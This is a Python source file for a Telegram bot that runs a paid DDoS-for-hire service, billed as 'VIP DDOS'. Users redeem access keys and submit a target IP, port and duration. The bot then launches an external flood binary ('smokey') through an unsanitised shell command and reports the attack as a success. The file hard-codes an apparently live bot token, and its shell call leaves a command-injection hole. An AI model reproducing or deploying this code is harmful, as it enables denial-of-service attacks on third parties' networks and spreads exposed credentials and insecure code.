import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta

# Telegram bot token
bot = telebot.TeleBot('8134663359:AAEBnY-0SxdQUwiTYPfWoTEyUhx-pJjfcoQ')

admin_id = {"5879359815", "5879359815"}

USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

MAX_chudai_TIME = 300

users = {}
keys = {}
last_chudai_time = {}

def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key():
    key = "KINGBHAI-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    keys[key] = {"status": "valid"}
    save_keys()
    return key

def log_command(user_id, target, port, chudai_time):
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {chudai_time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key(message):
    bot.reply_to(message, "🔑 Please enter your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        users[str(message.chat.id)] = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")

@bot.message_handler(func=lambda message: message.text == "📜 Users")
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    if not users:
        bot.reply_to(message, "⚠ No users found.")
        return
    response = "✅ *Registered Users* ✅\n\n" + "\n".join([f"🆔 {user}" for user in users])
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    chudai_button = types.KeyboardButton("🚀 chudai")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    bot_sitting_button = types.KeyboardButton("🤖 BOT SITTING")
    admin_panel_button = types.KeyboardButton("🔧 ADMIN_PANEL")
    if str(message.chat.id) in admin_id:
        markup.add(admin_panel_button)
    markup.add(chudai_button, myinfo_button, redeem_button,  bot_sitting_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)

# ... (keep all other handlers unchanged, same as your original code) ...

# Your chudai handler with a try-except to prevent crash
@bot.message_handler(func=lambda message: message.text == "🚀 chudai")
def handle_chudai(message):
    user_id = str(message.chat.id)
    try:
        if user_id in users and users[user_id]:
            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration:
                bot.reply_to(message, "❗ Your access has expired. Contact the admin to renew ❗")
                return
        else:
            bot.reply_to(message, "⛔️ Unauthorized Access! ⛔️")
            return

        # Cooldown check
        if user_id in last_chudai_time:
            time_since = (datetime.datetime.now() - last_chudai_time[user_id]).total_seconds()
            if time_since < 0:  # Edge case fix, negative delta
                time_since = 0
            if time_since < 0:  # Just safe check again
                time_since = 0
            COOLDOWN_PERIOD = 0
            if time_since < COOLDOWN_PERIOD:
                remaining = COOLDOWN_PERIOD - time_since
                bot.reply_to(message, f"⌛ Cooldown active. Wait {int(remaining)} seconds.")
                return

        bot.reply_to(message, "Enter target ip, port and duration (seconds) separated by space")
        bot.register_next_step_handler(message, process_chudai_details)
    except Exception as e:
        bot.reply_to(message, "⚠️ Error occurred. Try again later.")
        print(f"Error in handle_chudai: {e}")

def process_chudai_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) != 3:
        bot.reply_to(message, "Invalid format. Use: ip port duration")
        return
    target = details[0]
    try:
        port = int(details[1])
        chudai_time = int(details[2])
        if chudai_time > MAX_chudai_TIME:
            bot.reply_to(message, f"Max allowed time is {MAX_chudai_TIME} seconds.")
            return
        log_command(user_id, target, port, chudai_time)
        command = f"./smokey {target} {port} {chudai_time} 1000"
        subprocess.Popen(command, shell=True)
        last_chudai_time[user_id] = datetime.datetime.now()
        bot.reply_to(message, f"Attack sent to {target}:{port} for {chudai_time} seconds.")
        threading.Timer(chudai_time, send_chudai_finished_message, [message.chat.id, message.message_id, target, port, chudai_time]).start()
    except Exception as e:
        bot.reply_to(message, "Invalid port or time.")
        print(f"Error in process_chudai_details: {e}")

def send_chudai_finished_message(chat_id, message_id, target, port, chudai_time):
    message = (
        f"🔥 chudai COMPLETED! 🔥\n\n"
        f"🎯 TARGET: {target}:{port}\n"
        f"⏳ DURATION: {chudai_time} SECONDS\n"
        f"💀 STATUS: SUCCESS!\n\n"
        f"💀 MISSION SUCCESS!"
    )
    try:
        bot.send_message(chat_id, message, reply_to_message_id=message_id)
    except Exception as e:
        print(f"Error sending completion message: {e}")

# Similar try-except can be added to other handlers if needed...

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)  # Wait 5 sec before restarting polling